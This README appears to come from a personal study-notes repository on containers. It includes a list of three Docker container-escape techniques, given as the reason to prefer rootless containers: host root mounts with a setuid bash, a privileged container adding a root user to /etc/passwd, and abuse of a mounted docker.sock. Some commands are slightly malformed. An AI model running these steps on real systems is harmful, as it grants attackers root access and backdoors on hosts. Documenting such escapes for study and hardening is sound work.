# CONTAINERS

           ███╗░░░███╗░█████╗░███╗░░██╗██╗░░░██╗███████╗██╗░░░░░     
           ████╗░████║██╔══██╗████╗░██║██║░░░██║██╔════╝██║░░░░░     
           ██╔████╔██║███████║██╔██╗██║██║░░░██║█████╗░░██║░░░░░     
           ██║╚██╔╝██║██╔══██║██║╚████║██║░░░██║██╔══╝░░██║░░░░░     
           ██║░╚═╝░██║██║░░██║██║░╚███║╚██████╔╝███████╗███████╗     
           ╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝░╚═════╝░╚══════╝╚══════╝     

## Objetive
This containers repository contain documentation and study notes for containers concept probes.

## This repository contain the next folders:
1. [README.md - Getting started with docker image for start study docker.]( https://github.com/mgallegoa/conceptsProbes/tree/master/containers/docker-alpine-bash/README.md )
2. [README.md - Docker alpine linux image and install bash.]( https://github.com/mgallegoa/conceptsProbes/tree/master/containers/getting-started-app/README.md )

## Study notes

1. A good example to configure and run docker app (dev and prod), is [this list app project](https://github.com/mgallegoa/conceptsProbes/tree/master/react-ts-list-app)

2. To avoid use ROOTLESS CONTAINERS, 3 ways to hack a Linux machine using docker:
    2.1. docker run -v /:/mnt --rm -it alpine chroot /mnt sh ()
        2.1.1. docker run -v /:/mnt --rm -it ubuntu bash
        2.1.2. cp /bin/bash /mnt/tmp
        2.1.3. chmod +s /mnt/tmp/bash
        2.1.4. (outside of the container run like root) /tmp/bash -p
    2.2. Container con with privileged rights: docker run --privileged --rm -it ubuntu bash
        If want, mount the devise  like local: mount /dev/vda1 /mnt
        
        To allow enter with ssh, create a user and allow ssh
        apt-get install openssl
        openssl -1 -salt r00t password123
        echo 'r00t:$1$r00t039dje873jxjxxjjshgsx0:0:0:,,,:/root:/bin/bash' >> /mnt/etc/passwd

        Now acces with ssh: ssh r00t@64.35.76.252

    2.2. Access from a container with a socket mounted to the host files:
        2.2.1. docker run -v /var/run/docker.sock:/var/run/docker.sock --rm -it ubuntu bash
            ls -alh /var/run/docker.sock
            apt-get install docker.io
            docker ps (Show the container from the host)
            docker run -v /:/mnt --rm -it ubuntu bash


